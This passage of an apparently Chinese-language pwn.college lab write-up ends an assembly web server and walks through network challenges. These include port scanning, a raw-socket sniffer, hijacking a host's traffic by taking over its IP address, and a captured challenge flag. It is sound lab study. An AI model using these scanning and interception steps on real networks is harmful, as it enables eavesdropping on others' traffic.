rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Get the length of a null-terminated string (including the first null byte)</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - buffer we&#x27;re checking the length of</span><br><span class="line">    # rax - length</span><br><span class="line">    get_len:</span><br><span class="line">        mov rax, 0</span><br><span class="line">        get_len_loop:</span><br><span class="line">            # See if rdi + rax-th byte is null</span><br><span class="line">            mov r10, rdi</span><br><span class="line">            add r10, rax</span><br><span class="line">            mov r10, [r10]</span><br><span class="line">            add rax, 1</span><br><span class="line">            cmp r10, 0x00</span><br><span class="line">            jne get_len_loop</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    # Copy the bytes spanning rdi to rsi to the buffer rdx</span><br><span class="line">    # rdx MUST BE LONGER THAN rsi - rdi BYTES, rdi MUST BE LESS THAN rsi</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - start (exclusive) of the string we&#x27;re copying</span><br><span class="line">    # rsi - end (inclusive) of the string we&#x27;re copying</span><br><span class="line">    # rdx - buffer we&#x27;re copying to</span><br><span class="line">    # rax - unchanged</span><br><span class="line">    write_to_buf:</span><br><span class="line">        write_to_buf_loop:</span><br><span class="line">            add rdi, 1</span><br><span class="line">            mov r9, [rdi]</span><br><span class="line">            mov [rdx], r9</span><br><span class="line">            add rdx, 1</span><br><span class="line">            cmp rdi, rsi</span><br><span class="line">            jne write_to_buf_loop</span><br><span class="line">        mov byte ptr [rdx], 0x00</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    # Get address of the (last byte of) the nth occurence of substring in string (occurences must be non-overlapping)</span><br><span class="line">    # ONLY GUARANTEED TO WORK ON NULL-TERMINATED STRINGS</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - target string address</span><br><span class="line">    # rsi - n</span><br><span class="line">    # rdx - substring</span><br><span class="line"></span><br><span class="line">    # rax - address of nth character</span><br><span class="line">    get_nth_substr:</span><br><span class="line">        # Set rcx (ocurrence counter)</span><br><span class="line">        mov rcx, 0</span><br><span class="line">        # Set r10 (to traverse substring)</span><br><span class="line">        mov r10, rdx</span><br><span class="line">        check_character_loop:</span><br><span class="line">            # r9b = character at position</span><br><span class="line">            mov r9b, [rdi]</span><br><span class="line">            # If string&#x27;s terminated, obviously the substring doesn&#x27;t occur enough times</span><br><span class="line">            cmp r9b, 0x00</span><br><span class="line">            je not_enough_occurrences</span><br><span class="line">            # Step through substring iff r9b = current byte</span><br><span class="line">            cmp r9b, byte ptr [r10]</span><br><span class="line">            jne character_not_equal</span><br><span class="line">                add r10, 1</span><br><span class="line">                # If we&#x27;ve reached the end of the substring, increment counter and reset r10</span><br><span class="line">                cmp byte ptr [r10], 0x00</span><br><span class="line">                jne after_comparison</span><br><span class="line">                    mov r10, rdx</span><br><span class="line">                    add rcx, 1</span><br><span class="line">                    jmp after_comparison</span><br><span class="line">            character_not_equal:</span><br><span class="line">                # Reset r10 without adding to count</span><br><span class="line">                mov r10, rdx</span><br><span class="line">            after_comparison:</span><br><span class="line">            # Return address if we&#x27;ve got the nth ocurrence</span><br><span class="line">            cmp rcx, rsi</span><br><span class="line">            je match</span><br><span class="line">            # Otherwise increment and continue</span><br><span class="line">            add rdi, 1</span><br><span class="line">            jmp check_character_loop</span><br><span class="line">        match:</span><br><span class="line">        mov rax, rdi</span><br><span class="line">        ret</span><br><span class="line">        not_enough_occurrences:</span><br><span class="line">        mov rax, -1</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    # sockaddr_in struct</span><br><span class="line">    sa_family_t: .word 2</span><br><span class="line">    bind_port: .word 0x5000</span><br><span class="line">    bind_address: .double 0x00000000</span><br><span class="line">    pad: .byte 0,0,0,0,0,0,0,0</span><br><span class="line">    # Make empty buffers to read to</span><br><span class="line">    read_buffer: .space 1024</span><br><span class="line">    file_name_buffer: .space 1024</span><br><span class="line">    file_read_buffer: .space 1024</span><br><span class="line">    # Constants</span><br><span class="line">    # Yes it&#x27;s dumb to use a quad word for this, but it simplifies copying it to the register</span><br><span class="line">    read_packet_length: .quad 0x0000000000000400</span><br><span class="line">    write_static: .string &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    space: .string &quot; &quot;</span><br><span class="line">    double_cr_lf: .string &quot;\r\n\r\n&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="2-Intercepting-Communication"><a href="#2-Intercepting-Communication" class="headerlink" title="2. Intercepting Communication"></a>2. Intercepting Communication</h2><h3 id="2-1-Connect-to-a-remote-host"><a href="#2-1-Connect-to-a-remote-host" class="headerlink" title="2.1 Connect to a remote host"></a>2.1 Connect to a remote host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.3 31337</span><br></pre></td></tr></table></figure>



<h3 id="2-2-Listen-for-a-connection-from-a-remote-host"><a href="#2-2-Listen-for-a-connection-from-a-remote-host" class="headerlink" title="2.2 Listen for a connection from a remote host"></a>2.2 Listen for a connection from a remote host</h3><p><code>-l</code>表示<code>Netcat</code>进入监听状态、<code>-p</code>指定监听的端口号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 31337</span><br></pre></td></tr></table></figure>

<h3 id="2-3-Find-and-connect-to-a-remote-host"><a href="#2-3-Find-and-connect-to-a-remote-host" class="headerlink" title="2.3 Find and connect to a remote host"></a>2.3 Find and connect to a remote host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 31337 10.0.0.0/24 <span class="comment"># 使用nmap 扫描对应子网上开放31337端口的IP地址</span></span><br><span class="line">nc 10.0.0.63 31337 <span class="comment"># 建立链接</span></span><br></pre></td></tr></table></figure>

<h3 id="2-4-Find-and-connect-to-a-remote-host-on-a-large-network"><a href="#2-4-Find-and-connect-to-a-remote-host-on-a-large-network" class="headerlink" title="2.4 Find and connect to a remote host on a large network"></a>2.4 Find and connect to a remote host on a large network</h3><p>由于要寻找的子网数量庞大，使用python的多线程技术进行查找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.0.0/16 子网的起始 IP 和结束 IP</span></span><br><span class="line">start_ip = <span class="string">&#x27;10.0.0.0&#x27;</span></span><br><span class="line">end_ip = <span class="string">&#x27;10.0.255.255&#x27;</span></span><br><span class="line">port = <span class="number">31337</span></span><br><span class="line">num_threads = <span class="number">100</span>  <span class="comment"># 线程数</span></span><br><span class="line">output_file = <span class="string">&#x27;found_hosts.txt&#x27;</span>  <span class="comment"># 输出文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 IP 地址转换为整数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip_to_int</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将整数转换为 IP 地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_ip</span>(<span class="params">ip_int</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join([<span class="built_in">str</span>(ip_int &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)[::-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描指定 IP 地址的指定端口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;checking <span class="subst">&#123;ip&#125;</span>&quot;</span>)</span><br><span class="line">        s.settimeout(<span class="number">0.5</span>)</span><br><span class="line">        result = s.connect_ex((ip, port))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Found host: <span class="subst">&#123;ip&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span>\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> ip</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取起始和结束 IP 的整数值</span></span><br><span class="line">start_int = ip_to_int(start_ip)</span><br><span class="line">end_int = ip_to_int(end_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程池并行扫描</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=num_threads) <span class="keyword">as</span> executor:</span><br><span class="line">    future_to_ip = &#123;executor.submit(scan_ip, int_to_ip(ip_int)): int_to_ip(ip_int) <span class="keyword">for</span> ip_int <span class="keyword">in</span> <span class="built_in">range</span>(start_int, end_int + <span class="number">1</span>)&#125;</span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_ip):</span><br><span class="line">        ip = future_to_ip[future]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Successfully connected to <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span> generated an exception: <span class="subst">&#123;exc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-5-Monitor-traffic-from-a-remote-host"><a href="#2-5-Monitor-traffic-from-a-remote-host" class="headerlink" title="2.5 Monitor traffic from a remote host"></a>2.5 Monitor traffic from a remote host</h3><blockquote>
<p>IPV4头格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>


</blockquote>
<p>在端口上捕获TCP数据包</p>
<ul>
<li><p><code>!BBHHHBBH4s4s</code> 是用于解析二进制数据的格式字符串，它是 Python 的 <code>struct</code> 模块的一部分。</p>
<ul>
<li><p><code>!</code>：表示使用网络字节顺序（大端序）。</p>
</li>
<li><p><code>B</code>：表示一个无符号的 8 位整数（1 字节）。</p>
</li>
<li><p><code>H</code>：表示一个无符号的 16 位整数（2 字节）。</p>
</li>
<li><p><code>4s</code>：表示一个长度为 4 的字节串。</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_ip_header</span>(<span class="params">data</span>):</span><br><span class="line">    ip_header = struct.unpack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>, data[:<span class="number">20</span>])</span><br><span class="line">    version_ihl = ip_header[<span class="number">0</span>]</span><br><span class="line">    version = version_ihl &gt;&gt; <span class="number">4</span></span><br><span class="line">    ihl = version_ihl &amp; <span class="number">0xF</span></span><br><span class="line">    tos = ip_header[<span class="number">1</span>]</span><br><span class="line">    total_length = ip_header[<span class="number">2</span>]</span><br><span class="line">    identification = ip_header[<span class="number">3</span>]</span><br><span class="line">    flags_offset = ip_header[<span class="number">4</span>]</span><br><span class="line">    ttl = ip_header[<span class="number">5</span>]</span><br><span class="line">    protocol = ip_header[<span class="number">6</span>]</span><br><span class="line">    checksum = ip_header[<span class="number">7</span>]</span><br><span class="line">    src_ip = socket.inet_ntoa(ip_header[<span class="number">8</span>])</span><br><span class="line">    dst_ip = socket.inet_ntoa(ip_header[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">    ip_header_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;Header Length&#x27;</span>: ihl * <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;Type of Service&#x27;</span>: tos,</span><br><span class="line">        <span class="string">&#x27;Total Length&#x27;</span>: total_length,</span><br><span class="line">        <span class="string">&#x27;Identification&#x27;</span>: identification,</span><br><span class="line">        <span class="string">&#x27;Flags and Fragment Offset&#x27;</span>: flags_offset,</span><br><span class="line">        <span class="string">&#x27;TTL&#x27;</span>: ttl,</span><br><span class="line">        <span class="string">&#x27;Protocol&#x27;</span>: protocol,</span><br><span class="line">        <span class="string">&#x27;Header Checksum&#x27;</span>: checksum,</span><br><span class="line">        <span class="string">&#x27;Source IP&#x27;</span>: src_ip,</span><br><span class="line">        <span class="string">&#x27;Destination IP&#x27;</span>: dst_ip</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ip_header_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tcp_header</span>(<span class="params">data</span>):</span><br><span class="line">    tcp_header = struct.unpack(<span class="string">&#x27;!HHLLBBHHH&#x27;</span>, data[:<span class="number">20</span>])</span><br><span class="line">    src_port = tcp_header[<span class="number">0</span>]</span><br><span class="line">    dst_port = tcp_header[<span class="number">1</span>]</span><br><span class="line">    sequence = tcp_header[<span class="number">2</span>]</span><br><span class="line">    acknowledgment = tcp_header[<span class="number">3</span>]</span><br><span class="line">    offset_reserved_flags = tcp_header[<span class="number">4</span>]</span><br><span class="line">    data_offset = (offset_reserved_flags &gt;&gt; <span class="number">4</span>) * <span class="number">4</span></span><br><span class="line">    flags = tcp_header[<span class="number">5</span>]</span><br><span class="line">    window = tcp_header[<span class="number">6</span>]</span><br><span class="line">    checksum = tcp_header[<span class="number">7</span>]</span><br><span class="line">    urgent_pointer = tcp_header[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    tcp_header_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Source Port&#x27;</span>: src_port,</span><br><span class="line">        <span class="string">&#x27;Destination Port&#x27;</span>: dst_port,</span><br><span class="line">        <span class="string">&#x27;Sequence Number&#x27;</span>: sequence,</span><br><span class="line">        <span class="string">&#x27;Acknowledgment Number&#x27;</span>: acknowledgment,</span><br><span class="line">        <span class="string">&#x27;Data Offset&#x27;</span>: data_offset,</span><br><span class="line">        <span class="string">&#x27;Flags&#x27;</span>: flags,</span><br><span class="line">        <span class="string">&#x27;Window Size&#x27;</span>: window,</span><br><span class="line">        <span class="string">&#x27;Checksum&#x27;</span>: checksum,</span><br><span class="line">        <span class="string">&#x27;Urgent Pointer&#x27;</span>: urgent_pointer</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tcp_header_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sniffer</span>(<span class="params">port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>, port))</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listening on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            packet, addr = sock.recvfrom(<span class="number">65565</span>)</span><br><span class="line">            ip_header = parse_ip_header(packet[:<span class="number">20</span>])</span><br><span class="line">            tcp_header = parse_tcp_header(packet[<span class="number">20</span>:<span class="number">40</span>])</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;IP Header:&quot;</span>, ip_header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;TCP Header:&quot;</span>, tcp_header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Payload:&quot;</span>, packet[<span class="number">40</span>:])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sniffer stopped.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = <span class="number">31337</span></span><br><span class="line">    start_sniffer(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-6-Monitor-slow-traffic-from-a-remote-host"><a href="#2-6-Monitor-slow-traffic-from-a-remote-host" class="headerlink" title="2.6 Monitor slow traffic from a remote host"></a>2.6 Monitor slow traffic from a remote host</h3><p>首先使用<code>tshark -i eth0 -f &quot;tcp port 31337&quot; -w tcp_capture.pcap</code>抓取TCP数据包</p>
<p>然后使用wireshark 打开.pcap文件</p>
<p>右键点击数据包并点击Follow-&gt;TCP Stream 查看完整的TCP Stream内容</p>
<h3 id="2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface"><a href="#2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface" class="headerlink" title="2.7 Hijack traffic from a remote host by configuring your network interface"></a>2.7 Hijack traffic from a remote host by configuring your network interface</h3><p>10.0.0.4试图与10.0.0.2建立连接，我们要在子网中的10.0.0.3中建立与10.0.0.4的连接并拦截数据包。</p>
<p>首先使用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -nn -vv arp and host 10.0.0.4</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>**<code>tcpdump</code>**：这是一个网络抓包工具，用于捕获和分析通过网络接口传输的数据包。</li>
<li>**<code>-i eth0</code>**：指定监听的网络接口，这里是 <code>eth0</code>。<code>tcpdump</code> 将在这个接口上捕获数据包。</li>
<li>**<code>-nn</code>**：禁用主机名和端口名的解析，将直接显示IP地址和端口号，而不是尝试将它们解析为主机名和服务名称。<code>-n</code> 选项是指不进行主机名解析，第二个 <code>-n</code> 则是指不进行端口名解析。</li>
<li>**<code>-vv</code>**：增加输出的详细程度，显示更详细的信息。<code>-v</code> 表示详细输出，<code>-vv</code> 则表示更详细的输出。</li>
<li>**<code>arp</code>**：指定只捕获 ARP（地址解析协议）数据包。</li>
<li>**<code>and host 10.0.0.4</code>**：进一步过滤数据包，只捕获与 IP 地址 <code>10.0.0.4</code> 相关的 ARP 数据包。</li>
</ul>
</blockquote>
<p>得到输出<code>07:11:37.169764 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.0.0.2 tell 10.0.0.4, length 28</code></p>
<p>我们知道<code>10.0.0.4</code>正在子网中通过ARP协议寻找<code>10.0.0.2</code>的MAC地址。</p>
<p>如何设置当前主机的IP地址为<code>10.0.0.3</code>呢?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure>

<p>这条命令将网络接口 <code>eth0</code> 关闭，使其停止工作。这意味着在此接口上将不再发送或接收任何数据包。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.0.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>

<p>这条命令为 <code>eth0</code> 接口分配了一个新的 IP 地址和子网掩码。</p>
<p>**<code>10.0.0.2</code>**：这是分配给 <code>eth0</code> 接口的新的 IP 地址。</p>
<p>**<code>netmask 255.255.255.0</code>**：这是为 <code>eth0</code> 接口设置的子网掩码，表示该网络的子网范围（即 <code>10.0.0.x</code> 网络范围，子网掩码 255.255.255.0 表示该子网可以容纳 256 个 IP 地址，从 10.0.0.0 到 10.0.0.255）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

<p>重启 eth0接口，现在 <code>eth0</code> 将使用新分配的 IP 地址 <code>10.0.0.2</code> 和子网掩码 <code>255.255.255.0</code> 进行网络通信。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-3:~<span class="comment"># tcpdump -i eth0 -nn -vv arp and host 10.0.0.4</span></span><br><span class="line">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">07:32:39.844656 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">07:32:39.844683 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.0.0.2 is-at fe:b6:ce:6b:ab:98, length 28</span><br></pre></td></tr></table></figure>

<p>可以看出已经建立了连接。</p>
<p>接着查看端口31337中的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 31337</span><br><span class="line">pwn.college&#123;E7AsHod1vWLoBCbJmzDx9s42l3A.dVjNzMDL5cjM1UzW&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>-l</code>**：表示 Netcat 以服务器模式启动，监听指定端口。</li>
<li>**<code>-v</code>**：启用详细输出模式，显示更多的连接信息。</li>
<li>**<code>-p 31337</code>**：指定 Netcat 监听的端口号为 <code>31337</code>。</li>
</ul>
<h3 id="2-8-Manually-send-an-Ethernet-packet"><a href="#2-8-Manually-send-an-Ethernet-packet" class="headerlink" title="2.8 Manually send an Ethernet packet"></a>2.8 Manually send an Ethernet packet</h3><p>任务是向10.0.0.3的主机发送以太网帧，能否连接网络不重要，不能使用scapy构建以太网帧，10.0.0.3的mac地址在ppt中找到，本机的mac地址使用ifconfig命令获取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对方的MAC地址</span></span><br><span class="line">dst_mac = <span class="string">b&#x27;\xaa\xbb\xcc\xdd\xee\xff&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 您的MAC地址</span></span><br><span class="line">src_mac = <span class="string">b&#x27;\xa2\xd4\x52\x19\x77\xcc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EtherType</span></span><br><span class="line">ethertype = <span class="string">b&#x27;\xff\xff&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据负载 (可选)</span></span><br><span class="line">payload = <span class="string">b&#x27;Hello, Ethernet!&#x27;</span>  <span class="comment"># 这里可以是任意数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造以太网帧</span></span><br><span class="line">frame = dst_mac + src_mac + ethertype + payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)</span><br><span class="line">sock.bind((<span class="string">&quot;eth0&quot;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送以太网帧</span></span><br><span class="line">sock.send(frame)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ethernet frame sent!&quot;</span>)</span><br></pre></td></tr></table></figure>

